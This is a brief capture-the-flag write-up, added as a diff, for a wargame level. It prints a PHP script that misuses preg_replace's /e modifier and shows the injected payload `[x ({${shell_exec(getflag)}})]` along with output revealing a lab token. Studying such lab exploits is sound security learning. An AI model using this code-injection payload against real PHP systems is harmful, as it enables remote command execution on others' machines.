@@ -1,0 +1,22 @@
+in level06 we found a php file that contain:
+
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+we see that level06.php take a file content and if he match `[x (.*)]` he switch it to the second expression.
+so we gonna create a file that contain `[x ({${shell_exec(getflag)}})]`
+
+$> cat text
+[x ({${shell_exec(getflag)}})]
+
+after we gonna execute level06 with our file
+
+ $>./level06 text
+ PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+()
